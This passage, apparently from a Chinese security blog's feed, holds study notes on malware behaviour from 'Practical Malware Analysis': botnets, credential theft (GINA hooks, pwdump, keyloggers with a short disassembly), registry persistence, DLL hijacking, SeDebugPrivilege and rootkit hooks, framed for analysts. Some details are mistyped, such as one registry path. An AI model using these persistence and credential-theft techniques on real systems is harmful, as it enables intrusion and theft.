僵尸网络"></a>3. 僵尸网络</h3><p>僵尸网络是被感染主机（也称为僵尸主机）的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机网络，从而使僵尸网络传播其他的恶意代码或蠕虫，或者执行分布式拒绝服务（DDoS）攻击。</p><p>在实施分布式拒绝服务攻击时，所有僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="4-远程控制工具与僵尸网络的比较"><a href="#4-远程控制工具与僵尸网络的比较" class="headerlink" title="4. 远程控制工具与僵尸网络的比较"></a>4. 远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有一些不同</p><ol><li>僵尸网络感染和控制数以百万计的主机。远程控制工具通常只控制很少数量的主机。</li><li>僵尸网络中的所有主机在同一时刻被控制，而远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密地交互。</li><li>远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</li></ol><h2 id="11x3-登录凭证窃密器"><a href="#11x3-登录凭证窃密器" class="headerlink" title="11x3 登录凭证窃密器"></a>11x3 登录凭证窃密器</h2><p>攻击者经常会不遗余力地去窃取登录凭证，他们主要使用以下三种类型的恶意代码</p><ol><li>等待用户登录以窃取登录凭证的程序。</li><li>转储Windows系统中存放信息的程序，例如密码哈希值，程序直接使用它，或者对它进行离线破解。</li><li>击键记录程序。</li></ol><h3 id="1-GINA拦截"><a href="#1-GINA拦截" class="headerlink" title="1. GINA拦截"></a>1. GINA拦截</h3><p>在WindowsXP系统中，恶意代码使用微软图形识别和验证界面（GINA）拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程，如用硬件无线射频标识（RFID）令牌或者智能卡来进行身份认证等。恶意代码编写者利用GINA对第三方的支持来加载窃密器。</p><p>GINA在msgna.dll中实现，这个DLL在用户登录系统过程中由Winlogon可执行文件加载。Winlogon也为第三方定制实现DLL程序工作，在Winlogon与GINADLL之间加载第三方DLL（类似于中间人攻击）。为了方便，Windows用下列注册表项，来存储需要Winlogon加载的第三方DLL。<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\GinaDLL</code></p><h3 id="2-口令哈希转储"><a href="#2-口令哈希转储" class="headerlink" title="2. 口令哈希转储"></a>2. 口令哈希转储</h3><p>转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解，或者利用它们执行Pass-the-Hash攻击。Pass-the-Hash攻击在无须破解或解密口令哈希以获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获得访问权。</p><p>Pwdump和Pas-the-Hash（PSH）工具包是提供口令哈希转储免费可用的软件包。因为这两种工具都开源，很多恶意代码都派生于它们的源码。因为多数反病毒软件都拥有它们标准版本的特征码，所以通常情况下，攻击者要逃避探测就会编译他们的专有版本。</p><p>pwdump是一个程序集合，它从安全账户管理器（SAM）输出本地用户账户的LM和NTLM口令哈希。pwdump通过注入DLL到本地安全认证子系统服务（LSASS）进程进行攻击。我们将在第12章深入讨论DLL注入技术。现在，我们仅需要了解DLL注入是恶意代码在另外一个进程中运行DLL的一种方法，因此它提供了DLL与被注入进程相同的权限。口令哈希转储工具通常针对lsass.exe进程，因为它拥有足够的权限来访问很多有用的API函数。</p><p>标准pwdump程序使用的DLL是lsaext.dll，一旦DLL在lsass.exe中运行，pwdump就会调用GetHash，这个函数由lsaext.dll导出，目的是执行口令哈希提取。提取函数会使用未文档化的Windows函数，来枚举系统中的用户，并且获得每个用户未解密的口令哈希。</p><p>处理pwdump程序变种时，你需要分析DLL，以便确定它如何执行口令哈希转储操作。首先查看DLL的导出函数，pwdump默认的导出函数是GetHash，但是攻击者可以很容易地修改这个导出函数的名字，使它不那么显而易见。接下来，尝试确定导出函数使用的API函数。因为多数API函数需要动态解析，所以口令哈希转储导出函数通常会多次调用GetProcAddress。</p><h3 id="3-击键记录"><a href="#3-击键记录" class="headerlink" title="3. 击键记录"></a>3. 击键记录</h3><p>击键记录是一种传统形式的窃取登录凭证方法。当击键记录开启时，恶意代码能够记录用户击键操作，从而让攻击者能够观察到用户敲入的数据，如用户名、密码。Windows平台上的恶意代码使用多种形式的击键记录。</p><blockquote><p>基于内核的击键记录器</p></blockquote><p>用户模式下的应用程序很难探测到基于内核的击键记录器。它们经常作为Rootkit的一部分并且它们作为一个键盘驱动绕过用户空间应用程序和保护，来捕获击键操作。</p><blockquote><p>用户空间的击键记录器</p></blockquote><p>Windows用户空间的击键记录器通常使用WindowsAPI并且常通过挂钩（hook）或者轮询来实现。</p><p>挂钩在键盘每次按下时用Windows API通知恶意代码，通常使用SetwindowsHookEx安装挂钩。轮询使用Windows API不断地轮询按键的状态，它通常使用函数GetAsyncKeyState和GetForegroundWindow。</p><p>挂钩击键记录器使用的WindowsAPl函数是SetwindowsHookEx。这种类型的恶意代码可能被打包成一个初始化挂钩函数的可执行文件，它也可能包含一个处理击键记录的DLL文件，这个DLL文件被自动地映射到系统的多个进程中。</p><p>GetAsynckeyState函数用来识别一个按键是被按下还是被弹起，是否是在最近一次GetAsyncKeyState函数被调用后按下。GetForegroundWindow函数识别当前聚焦的前端窗口，它告诉击键记录器当前哪个应用程序正在执行输入（例如Notepad、Internet Explorer）。</p><blockquote><p>轮询击键记录器中的典型循环结构<br><img src="https://i.loli.net/2018/07/23/5b554852b3083.jpg" alt="i"></p><p>GetAsynckeyState和GetForegroundWindow 击键记录器的反汇编<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401162 call ds:GetForegroundWindow</span><br><span class="line">···</span><br><span class="line">00401272 push 10h ；nVirtKey Shift</span><br><span class="line">00401274 call ds:GetKeyState</span><br><span class="line">0040127A mov esi，dword_403308[ebx]</span><br><span class="line">00401280 push esi；vKey</span><br><span class="line">00401281 movsx edi，ax</span><br><span class="line">00401284 call ds:CetAsyncKeyState</span><br><span class="line">0040128A test ah，80h</span><br><span class="line">0040128D jz short 1oc_40130A</span><br><span class="line">0040128F push 14h；nvirtkey Caps Lock</span><br><span class="line">00401291 call ds:GetKeyState</span><br><span class="line">···</span><br><span class="line">004013EF add ebx，4</span><br><span class="line">004013F2 cmp ebx，368</span><br><span class="line">004013F8 j1 loc_401272</span><br></pre></td></tr></table></figure></p></blockquote><p>在进入内部循环之前程序调用了GetForegroundwindow函数。内部循环开始后，立即使用GetKeyState检查Shift键的状态，函数GetKeyState是快速检查按键状态的方法，与GetAsyncKeyState一样，它不能记住在它被调用后，按键是否被按下。接下来，击键记录器用EBX来索引键盘上的按键数组。如果一个新的按键被按下，击键记录器在调用GetkeyState查看CapsLock是否被激活之后，记录击键。最后，递增EBX确保代码清单中的下一个按键被检查。一旦检查了92个（368/4）按键，内部循环就结束了，再次调用GetForegroundwindow进入新的内部循环。</p><blockquote><p>通过字符串列表识别击键记录器</p></blockquote><p>可以通过查看恶意代码的导入API来识别击键记录器的功能。也可以通过检查标志字符串列表来识别击键记录器的功能，对于使用导入函数混淆技术或者使用你未见过的击键记录器功能的恶意代码来说，这种技术特别有用。</p><h2 id="11x4-存活机制"><a href="#11x4-存活机制" class="headerlink" title="11x4 存活机制"></a>11x4 存活机制</h2><p>一旦恶意代码获取系统的控制权，它通常就会在系统中驻留很长一段时间，恶意代码的这种行为被称为存活。如果存活机制足够特别，它甚至能作为给定恶意代码的指纹。</p><h3 id="1-Windows注册表"><a href="#1-Windows注册表" class="headerlink" title="1. Windows注册表"></a>1. Windows注册表</h3><p>一些工具可以帮助你搜索恶意代码在注册表中的存活位置，例如Sysintermals的自动化程序，它可以帮你找出系统中所有的自动启动程序。像ProcMon这样的工具可以帮助你在执行基本的动态分析时，监控系统中的所有注册表修改。</p><blockquote><p>AppInit_DLL</p></blockquote><p>恶意代码编写者可以通过一个名为AppInit DLL特殊注册表项来让他们的DLL获得加载。AppInit_DLL中的DLL程序会在进程加载User32.dl时被加载。插入DLL路径到注册表Applnit_DLL，会让DLL程序获得加载机会。</p><p>AppInit_DLL的值存储在如下Windows注册表键中<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code><br>Applnit_DLL值的类型是REG_SZ，它由空格分隔的字符串组成。很多进程都会加载User32.dll，这些进程也会加载Applnit DLL。恶意代码编写者通常只针对一个单独进程，但是AppInit DLL会被加载到多个进程中。因此，恶意代码编写者执行攻击负载（playload）前必须检查它运行在哪个进程中。这种检查通常在恶意DLL程序的DLLMain函数中完成。</p><blockquote><p>Winlogon Notify</p></blockquote><p>恶意代码编写者可以挂钩一个特殊的Winlogon事件，如登录、注销、关机以及锁屏，等等。这甚至可以允许恶意代码在安全模式下加载。下面注册表键中的注册表项包含Notify的值。<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Winlogon\</code><br>当winlogon.exe产生一个事件时，Windows系统会检查Notify注册表键来查找处理这个事件的DLL程序。</p><blockquote><p>SvcHost DLL</p></blockquote><p>所有服务都存在于注册表中，如果一个服务的注册表键被移除，则这个服务将不能启动。恶意代码经常作为一个服务安装，但是更多的时候作为一个可执行文件使用。安装的恶意代码作为swchost.exe的DLL来存活，这使得恶意代码可以与其他进程混淆，且更像标准的服务。</p><p>svchost.exe是从动态链接库中运行服务的通用主机进程，Windows操作系统通常同一时刻运行多个svchost.exe实例。每个实例包含一组服务，这些服务能够使开发、测试以及服务组管理变得更简单。</p><p>这些组被定义在下列的注册表位置（每个值代表一个不同的组）<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\MicroSoft\Windows NT\CurrentVersion\Svchost</code></p><p>服务被定义在下列的注册表位置<br><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</code></p><p>Windows服务包含多个注册表值，其中多数提供关于服务的信息。例如DisplayName和Description。恶意代码编写者通常会设置有助于恶意代码混淆的值，例如NetWareMan，它提供访问文件和打印NetWare网络资源的服务。另外一个注册表值为ImagePath，它包含服务可执行文件的位置。以svuchost.exe DLL为例，这个注册表值包含<code>%SystemRoot%/System32/svchost.exe -k GroupName</code>。</p><p>所有的svchost.exe DLL包含拥有ServiceDLL值的Parameters键，这是恶意代码编写者设置恶意DLL程序的位置，Parameters键下另一个值start用来确定服务何时启动（恶意代码通常设置为系统引导时启动）。</p><p>Windows拥有很多预先定义的服务组，所以恶意代码通常不会创建一个新的服务组，因为新创建的服务组很容易被探测。相反，多数恶意代码会将其加入一个已经存在的组或者覆盖一个无关紧要的服务——经常使用netsvcs服务组中很少使用的服务。要识别这种技术，使用动态分析监视Windows的注册表，或者在反汇编中查找CreateServiceA函数。如果恶意代码修改这些注册表键，你就会知道它们使用了这种存活技术。</p><h3 id="2-特洛伊木马化（Trojanized）系统二进制文件"><a href="#2-特洛伊木马化（Trojanized）系统二进制文件" class="headerlink" title="2. 特洛伊木马化（Trojanized）系统二进制文件"></a>2. 特洛伊木马化（Trojanized）系统二进制文件</h3><p>利用这种技术，恶意代码能够修改系统的二进制文件，当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。恶意代码编写者主要针对Windows系统正常操作时最常使用的二进制文件，而DLL是恶意代码编写者欢迎的目标。</p><p>恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。这些修改补丁覆盖函数的开始代码或者覆盖其他一些并不影响特洛伊木马化DLL正常操作的代码。为了不影响二进制文件的正常操作，恶意的代码被加入到可执行文件的一个空节中。插入的代码通常用来加载恶意代码，插入的函数并不关心它被插入到被感染的DLL的何处。加载恶意代码后，为了让DLL的操作与插入前的代码一致，代码会跳转回原始的DLL程序。</p><p>检查一个受感染的系统时，我们会注意到系统的二进制文件rutils.dll没有预想的MD5哈希值，所以我们进一步调查。我们将可疑版本的rtutils.dll与干净版本的rutils.dll一同加载到IDAPro。比较它们的D11EntryPoint函数。不同之处十分明显：特洛伊木马化版本的rtutits.dl会跳转到其他位置。<br><img src="https://i.loli.net/2018/07/23/5b557303ce5cd.jpg" alt="i"></p><h3 id="3-DLL加载顺序劫持"><a href="#3-DLL加载顺序劫持" class="headerlink" title="3. DLL加载顺序劫持"></a>3. DLL加载顺序劫持</h3><p>DLL加载顺序劫持是一种简单隐蔽的技术，它允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。这种技术甚至不需要单独的恶意加载器，因为它有能力让Windows加载它。</p><blockquote><p>在WindowsXP上加载DLL的默认搜索顺序</p><ol><li>加载应用程序的目录。</li><li>当前目录。</li><li>系统目录（使用GetsystemDirectory函数获取的路径，例如…/Windows/System32）。</li><li>16位子系统的系统目录（例如.…/Windows/System）。</li><li>Windows目录（使用GetwindowsDirectory获取的路径，例如.…/Windows）。</li><li>PATH环境变量里列出的目录。</li></ol></blockquote><p>在WindowsXP系统中，利用KnownDLL注册表键可以跳过DLL的加载过程，这个注册表键保护一些特定的DLL位置列表，这些DLL通常位于…/Windows/System32/目录下。设计KnownDLL机制的目的是改善安全（恶意的DLL不能放到加载顺序的前面）和速度（Windows不需要默认搜索前面的列表），但是它仅包含一个较短的重要DLL列表。</p><p>DLL加载顺序劫持可以被/System32之外目录中的二进制文件利用，来加载/System32目录中未被KnownDLL保护的DLL程序。例如，/Windows目录下explorer.exe会加载/System32目录下的ntshrui.dll。由于ntshrui.dll并不是一个KnownDLL，所以遵循默认搜索顺序，另外，/Windows目录在/System32目录之前被搜索。如果恶意的DLL被命名为ntshrui.dll并放到/Windows目录，则它将被加载到合法DLL的位置。为了让系统正常运行，恶意DLL程序随后再加载真正的DLL。</p><p>/System32目录之外的二进制文件都容易受到这种攻击，其中explorer.exe约有50个易受攻击的DLL。此外，由于DLL递归导入的原因，很多DLL会加载其他的DLL，而这些DLL按照默认顺序加载，因此KnownDLL机制也不能得到充分的保护。</p><h2 id="11x5-提权"><a href="#11x5-提权" class="headerlink" title="11x5 提权"></a>11x5 提权</h2><p>多数提权攻击是利用本地系统已知漏洞或者0day漏洞进行攻击，其中多数可以在Metasploit Framework中找到（<a href="http://www.metasploit.com/" target="_blank" rel="noopener">http://www.metasploit.com/</a> ）。甚至，DLL加载顺序劫持也可以被用来执行特权操作。如果恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么恶意DLL就获得了提权。拥有提权操作的恶意代码比较罕见，但是分析人员应该能识别常见的提权方法。</p><p>有时，甚至当用户以本地管理员运行时，恶意代码还会要求提权。运行在Windows系统中的进程或者运行在用户级别，或者运行在系统级别。通常用户不能操纵系统级别的进程，即使他们是管理员。</p><h3 id="1-使用SeDebugPrivilege"><a href="#1-使用SeDebugPrivilege" class="headerlink" title="1. 使用SeDebugPrivilege"></a>1. 使用SeDebugPrivilege</h3><p>以用户权限运行的进程并没有任意访问系统一切资源的权限，也不能拥有这种权限。例如在远程进程中调用类似于TerminateProcess和CreateRemoteThread函数。恶意代码获得访问这些函数的权限的唯一方法是通过设置访问令牌的权限来开启SeDebugPrivilege.在Windows系统中，访问令牌（access token）是一个包含进程安全描述符的对象。安全描述符用来指定拥有者的访问权限。</p><p>SeDebugPrivilege特权作为一个系统级别调试的工具被创建，但是恶意代码编写者用它来获取系统进程拥有的所有权限。默认情况下，SeDebugPrivilege只赋给本地管理员账户，基本可以认为赋予用户SeDebugPrivilege权限就等于给予他们本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限，它的这种请求会被拒绝。</p><h2 id="11x6-隐藏它的踪迹——用户态的Rootkit"><a href="#11x6-隐藏它的踪迹——用户态的Rootkit" class="headerlink" title="11x6 隐藏它的踪迹——用户态的Rootkit"></a>11x6 隐藏它的踪迹——用户态的Rootkit</h2><p>恶意代码经常不遗余力地对用户隐藏它的生存机制和正在运行的进程。常用来隐藏恶意代码行为的工具被称为Rootkit。</p><p>Rootkit有多种存在形式，但是大部分Rootkt通过修改操作系统内部的功能来工作。这种修改可以使恶意代码的文件、进程、网络连接以及其他资源对其他程序隐藏，这也使得反病毒产品、管理员以及安全分析人员难以发现它们的恶意活动。</p><p>一些Rootkt会修改用户态的应用程序，但大部分会修改内核，因为保护机制（例如入侵防护系统）都运行在内核层。当它们运行在内核层而不是用户层时，Rootkit和入侵防御机制都很有效。在内核层，Rootkit比在用户层更容易破坏操作系统。</p><p>处理用户态安装挂钩Rootkit的一种较好策略是：先确定挂钩的位置，然后找出挂钩都干了什么。</p><h3 id="1-IAT-Hook"><a href="#1-IAT-Hook" class="headerlink" title="1. IAT Hook"></a>1. IAT Hook</h3><p>IAT Hook是用户空间中一种经典的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接。这种挂钩方法修改导入地址表（IAT）或者导出地址表（EAT）。</p><p>IAT Hook是一种过时且容易探测的挂钩方式，因此现代的Rootkit都使用更高级的inline Hook方法代替。</p><h3 id="2-Inline-Hook"><a href="#2-Inline-Hook" class="headerlink" title="2. Inline Hook"></a>2. Inline Hook</h3><p>Inline Hook是通过覆盖导入DLL中APl函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook只简单地修改函数指针，但Inline Hook将修改实际的函数代码。</p><p>恶意Rootkit通常用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行。另外，Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p><p>From <a href="https://kabeor.github.io/第11章  恶意代码行为/">https://kabeor.github.io/第11章  恶意代码行为/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第11章-恶意代码行为&quot;&gt;&lt;a href=&quot;#第11章-恶意代码行为&quot; class=&quot;headerlink&quot; title=&quot;第11章  恶意代码行为&quot;&gt;&lt;/a&gt;第11章  恶意代码行为&lt;/h1&gt;&lt;h2 id=&quot;11x1-下载器和启动器&quot;&gt;&lt;a href=&quot;#11x
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第四篇 恶意代码功能篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E7%AF%87-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
